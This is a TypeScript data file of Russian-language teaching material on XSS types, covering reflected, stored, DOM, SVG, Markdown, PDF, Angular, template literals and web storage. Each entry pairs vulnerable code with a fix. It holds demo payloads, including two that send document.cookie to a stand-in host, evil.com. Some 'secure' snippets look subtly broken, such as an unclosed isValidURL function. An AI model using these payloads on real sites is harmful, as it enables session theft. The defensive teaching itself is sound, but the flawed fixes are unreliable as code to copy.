// ============================================================
// XSS Types — Educational Content
// ============================================================
export const xssTypes = [
  {
    id: 'reflected',
    title: 'Отражённый XSS (Reflected XSS)',
    description:
      'Отражённый XSS возникает, когда вредоносный скрипт встраивается в ответ сервера как результат запроса, содержащего внедрённый код. Скрипт «отражается» от сервера к пользователю через URL-параметры, формы или заголовки.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Ввод пользователя вставляется напрямую без санитизации
  document.getElementById('search-result').innerHTML =
    new URLSearchParams(location.search).get('q');
  // Атака: ?q=<script>alert('XSS')</script>
  // Или: ?q=<img src=x onerror=alert('XSS')>
</script>`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Используем textContent вместо innerHTML
  const query = new URLSearchParams(location.search).get('q');
  document.getElementById('search-result').textContent = query;

  // Или с серверной санитизацией (Node.js)
  const escapeHTML = (str) => str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
</script>`,
    attackDemo: '<script>alert("XSS-атака выполнена!")</script>',
    mitigation:
      'Используйте textContent вместо innerHTML, кодируйте спецсимволы, применяйте Content Security Policy (CSP).',
  },
  {
    id: 'stored',
    title: 'Хранимый XSS (Stored XSS)',
    description:
      'Хранимый XSS — наиболее опасный тип, при котором вредоносный скрипт сохраняется на сервере (в базе данных, логах, комментариях) и выполняется при каждом отображении страницы. В отличие от отражённого XSS, жертве не нужно переходить по специальной ссылке — достаточно просто открыть страницу.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД —评论区 -->
<div class="comments">
  <!-- Комментарии из базы данных -->
  <div class="comment">
    <strong>Пользователь</strong>
    <p>{{comment.text}}</p>
    <!-- Если в comment.text содержится:
         <script>stealCookies()</script>
         Он будет выполнен для КАЖДОГО посетителя!
    -->
  </div>
</div>

<!-- Express.js backend -->
app.post('/api/comments', (req, res) => {
  // Сохраняем комментарий без санитизации
  db.query('INSERT INTO comments (text) VALUES (?)',
    [req.body.text]);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div class="comments">
  <div class="comment">
    <strong>Пользователь</strong>
    <!-- Используем HTML-кодирование -->
    <p>{{escapeHTML(comment.text)}}</p>
  </div>
</div>

<!-- Backend с санитизацией -->
const DOMPurify = require('dompurify');
app.post('/api/comments', (req, res) => {
  // Санитизируем HTML перед сохранением
  const cleanText = DOMPurify.sanitize(req.body.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  db.query('INSERT INTO comments (text) VALUES (?)', [cleanText]);
});`,
    attackDemo: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
    mitigation:
      'Санитизируйте ввод перед сохранением в БД. Используйте DOMPurify для очистки HTML. Применяйте CSP заголовки.',
  },
  {
    id: 'dom',
    title: 'DOM-based XSS',
    description:
      'DOM-based XSS возникает, когда уязвимость находится в клиентском JavaScript-коде, который модифицирует DOM-дерево на основе данных из ненадёжного источника. В отличие от отражённого и хранимого XSS, вредоносный код вообще не отправляется на сервер — вся атака происходит в браузере.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — на стороне клиента
// Чтение данных из location.hash (фрагмента URL)
const userInput = location.hash.substring(1);

// Опасно — вставка HTML через innerHTML
document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + userInput + '!';

// Атака: #<img src=x onerror=alert('XSS')>
// Результат: <div id="welcome">
//   Добро пожаловать, <img src=x onerror=alert('XSS')>!
// </div>

// Другие опасные источники:
// - document.referrer
// - document.cookie
// - window.name
// - localStorage/sessionStorage
// - postMessage`,
    secureCode: `// БЕЗОПАСНЫЙ КОД
const userInput = location.hash.substring(1);

// Вариант 1: Использовать textContent
document.getElementById('welcome').textContent =
  'Добро пожаловать, ' + userInput + '!';

// Вариант 2: Кодирование спецсимволов
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + escapeHTML(userInput) + '!';

// Вариант 3: Использовать URI-кодирование
const safeInput = decodeURIComponent(userInput);
// Всегда валидируйте входные данные!`,
    attackDemo: '#<img src=x onerror="document.body.style.background=\'red\'">',
    mitigation:
      'Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.',
  },
  {
    id: 'svg',
    title: 'SVG XSS',
    description:
      'XSS через SVG-файлы — внедрение JavaScript в SVG-изображения. SVG поддерживает JavaScript, что позволяет злоумышленникам внедрять скрипты в «изображения», загружаемые на сайт.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — загрузка SVG без проверки -->
<img src="/uploads/user-avatar.svg" alt="Avatar">

<!-- Содержимое malicious.svg: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
  <!-- Или через обработчик событий: -->
  <svg onload="alert(document.cookie)">
  <!-- Или через animate: -->
  <animate onbegin="alert(1)" attributeName="x" />
</svg>

<!-- Сервер принимает SVG без проверки: -->
app.post('/upload', (req, res) => {
  // Проверяет только Content-Type: image/svg+xml
  // Но не проверяет содержимое на script/handler
  fs.writeFile(req.file.path, req.file.buffer);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — использовать img с CSP -->
<!-- Заголовок CSP блокирует inline-скрипты в SVG: -->
<!-- Content-Security-Policy: script-src 'self' -->

<!-- Или конвертировать SVG в PNG на сервере: -->
const sharp = require('sharp');
app.post('/upload', async (req, res) => {
  if (req.file.mimetype === 'image/svg+xml') {
    // Конвертируем в PNG — JavaScript потеряется
    await sharp(req.file.buffer)
      .png()
      .toFile(\`uploads/\${req.file.filename}.png\`);
  }
});

<!-- Или использовать object с sandbox: -->
<object data="safe.svg" type="image/svg+xml"
        sandbox="allow-same-origin">
</object>`,
    attackDemo: '<svg onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/></svg>',
    mitigation:
      'Конвертируйте SVG в PNG на сервере. Используйте CSP для блокировки inline-скриптов. Санитизируйте SVG через DOMPurify с удалением <script> и обработчиков событий.',
  },
  {
    id: 'markdown',
    title: 'Markdown XSS',
    description:
      'XSS через Markdown-рендеринг — многие парсеры Markdown позволяют HTML-разметку внутри текста, что может быть использовано для внедрения скриптов.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — Markdown с HTML -->
<!-- Пользовательский ввод: -->
<!-- [Click here](javascript:alert('XSS')) -->
<!-- Или: <img src=x onerror=alert('XSS')> -->

const md = require('markdown-it')();
const html = md.render(userInput);
document.getElementById('content').innerHTML = html;

<!-- markdown-it по умолчанию разрешает HTML -->
<!-- React с marked: -->
import marked from 'marked';
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{
    __html: marked(text)  // HTML не санитизирован!
  }} />;
}`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — санитизация Markdown -->
import DOMPurify from 'dompurify';
import marked from 'marked';

function Comment({ text }) {
  const rawHtml = marked(text);
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote'],
    ALLOWED_ATTR: ['href', 'title'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick'],
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form']
  });
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

<!-- Или отключить HTML в markdown-it: -->
const md = require('markdown-it')({ html: false });`,
    attackDemo: '[Click here](javascript:alert(document.cookie))\n\n<img src=x onerror=alert("XSS")>',
    mitigation:
      'Отключите HTML в Markdown-парсере (html: false). Используйте DOMPurify для санитизации результата. Запретите javascript: URL-схемы.',
  },
  {
    id: 'pdf',
    title: 'PDF XSS',
    description:
      'XSS через PDF-файлы — встроенный PDF-просмотрщик браузера может выполнять JavaScript из PDF-документов через Embedded Files и JavaScript API PDF.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -- PDF с JavaScript -->
<!-- PDF может содержать: -->
<!-- this.disclosedDoc = true; -->
<!-- app.alert("XSS"); -->
<!-- -->

<!-- Сервер разрешает загрузку PDF: -->
app.post('/upload-pdf', (req, res) => {
  // Проверяет только расширение .pdf
  // Но не проверяет содержимое на JavaScript
  if (req.file.originalname.endsWith('.pdf')) {
    fs.writeFile(req.file.path, req.file.buffer);
  }
});

<!-- Пользователь открывает PDF в браузере: -->
<embed src="/uploads/report.pdf" type="application/pdf">
<!-- PDF.js или встроенный просмотрщик может выполнить JS -->`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -- санитизация PDF -->
const { PDFDocument } = require('pdf-lib');

app.post('/upload-pdf', async (req, res) => {
  const pdf = await PDFDocument.load(req.file.buffer);
  // Удаляем все JavaScript из PDF
  pdf.setJavaScript([]);
  pdf.setJavaScriptForAction([]);
  // Удаляем встроенные файлы
  pdf.removeEmbeddedFiles();
  const cleanBuffer = await pdf.save();
  fs.writeFile(req.file.path, cleanBuffer);
});

<!-- Или конвертировать в изображения: -->
<!-- Использовать pdf2pic или similar -->
<embed src="/uploads/report.pdf#toolbar=0&navpanes=0" type="application/pdf">`,
    attackDemo: 'PDF с встроенным JavaScript: this.disclosedDoc = true; app.alert("XSS");',
    mitigation:
      'Удаляйте JavaScript из PDF на сервере (pdf-lib). Конвертируйте PDF в изображения. Используйте песочницу для просмотра. Устанавливайте Content-Disposition: attachment.',
  },
  {
    id: 'angular',
    title: 'Angular/XSS через bypass санитизации',
    description:
      'Angular автоматически экранирует XSS в шаблонах, но существуют обходные пути через bypassSecurityTrustHtml, небезопасные пайпы и DOM APIs.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — Angular компонент
@Component({
  template: \`
    <div [innerHTML]="userComment"></div>
    <!-- userComment: <img src=x onerror="alert(1)"> -->
  \`
})
export class CommentComponent {
  @Input() userComment: string;
  // Angular санитизирует innerHTML, но...
}

// Уязвимость: разработчик обходит санитизацию
@Component({
  template: '<div [innerHTML]="trustedContent"></div>'
})
export class PostComponent {
  trustedContent: SafeHtml;
  constructor(private sanitizer: DomSanitizer) {
    // Опасно! Пользовательский ввод помечается как trusted
    this.trustedContent =
      sanitizer.bypassSecurityTrustHtml(userInput);
  }
}`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — Angular -->
@Component({
  template: \`
    <!-- textContent по умолчанию — безопасно -->
    <div>{{ userComment }}</div>

    <!-- Если нужен HTML — санитизируйте -->
    <div [innerHTML]="userComment | sanitizeHtml"></div>
  \`
})

// Безопасный пайп для санитизации
@Pipe({ name: 'sanitizeHtml' })
export class SanitizeHtmlPipe implements PipeTransform {
  constructor(private sanitizer: DomSanitizer) {}
  transform(value: string): SafeHtml {
    // Разрешаем только безопасные теги
    const cleaned = DOMPurify.sanitize(value, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br']
    });
    return this.sanitizer.bypassSecurityTrustHtml(cleaned);
  }
}`,
    attackDemo: '<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">',
    mitigation:
      'Не используйте bypassSecurityTrustHtml с пользовательским вводом. Используйте DOMPurify для санитизации. Применяйте {{}} вместо [innerHTML] когда возможно.',
  },
  {
    id: 'template-literal',
    title: 'XSS через Template Literals и String Interpolation',
    description:
      'JavaScript template literals (`${expr}`) могут выполнять XSS, если используются для генерации HTML с пользовательским вводом.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД
function renderUserProfile(user) {
  // Template literal + innerHTML = XSS
  document.getElementById('profile').innerHTML = \`
    <div class="profile">
      <h1>\${user.name}</h1>
      <p>\${user.bio}</p>
      <img src="\${user.avatar}" onerror="alert('XSS')">
      <!-- Если user.name = '<script>alert(1)</script>' -->
    </div>
  \`;
}

// Ещё хуже — серверный рендеринг:
const template = (data) => \`
  <html>
    <body>
      <h1>\${data.title}</h1>
      \${data.content}
      <!-- content может содержать </body></html> + script -->
    </body>
  </html>
\`;`,
    secureCode: `// БЕЗОПАСНЫЙ КОД
function escapeHTML(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function renderUserProfile(user) {
  // Все переменные экранированы
  document.getElementById('profile').innerHTML = \`
    <div class="profile">
      <h1>\${escapeHTML(user.name)}</h1>
      <p>\${escapeHTML(user.bio)}</p>
      <img src="\${escapeHTML(user.avatar)}">
    </div>
  \`;
}

// Или используйте template engine с autoescape:
const ejs = require('ejs');
ejs.render(template, data, { escape: true });`,
    attackDemo: 'user.name = "<img src=x onerror=alert(document.cookie)>"',
    mitigation:
      'Всегда экранируйте переменные в template literals перед вставкой в HTML. Используйте автоматическое экранирование в шаблонизаторах (EJS, Nunjucks autoescape).',
  },
  {
    id: 'web-storage',
    title: 'XSS через localStorage/sessionStorage',
    description:
      'Данные из localStorage/sessionStorage не санитизируются автоматически. Если вредоносный скрипт сохранит XSS payload в storage, а другой компонент отобразит его через innerHTML — произойдёт атака.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД
// Страница A — сохраняет данные
localStorage.setItem('userPrefs', JSON.stringify({
  theme: document.querySelector('input[name=theme]').value,
  // Атакующий: theme = '"><script>stealData()</script>'
}));

// Страница B — читает и отображает
const prefs = JSON.parse(localStorage.getItem('userPrefs'));
document.getElementById('prefs').innerHTML = \`
  Тема: \${prefs.theme}
  <!-- Если prefs.theme содержит HTML/JS — XSS! -->
\`;

// Ещё вариант — URL hash в storage
const redirect = new URLSearchParams(location.search).get('redirect');
localStorage.setItem('lastRedirect', redirect);
// Later:
document.getElementById('nav').innerHTML =
  '<a href="' + localStorage.getItem('lastRedirect') + '">Back</a>';`,
    secureCode: `// БЕЗОПАСНЫЙ КОД
// Всегда санитизируйте данные из storage
const prefs = JSON.parse(localStorage.getItem('userPrefs'));
document.getElementById('prefs').textContent =
  'Тема: ' + String(prefs.theme);

// Для URL — валидация
const redirect = localStorage.getItem('lastRedirect');
if (redirect && isValidURL(redirect)) {
  const link = document.createElement('a');
  link.href = redirect;
  link.textContent = 'Back';
  document.getElementById('nav').appendChild(link);
}

function isValidURL(str) {
  try {
    const url = new URL(str);
    return url.protocol === 'https:' &&
           url.hostname === 'myapp.com';
  } catch (e) {
    if (process.env.NODE_ENV === "development") console.warn("[xss-data.ts] isValidURL failed:", e);
}`,
    attackDemo: "localStorage.setItem('lastRedirect', 'javascript:alert(document.cookie)');",
    mitigation:
      'Никогда не вставляйте данные из localStorage через innerHTML без санитизации. Используйте textContent или createElement с установкой свойств.',
  },
];
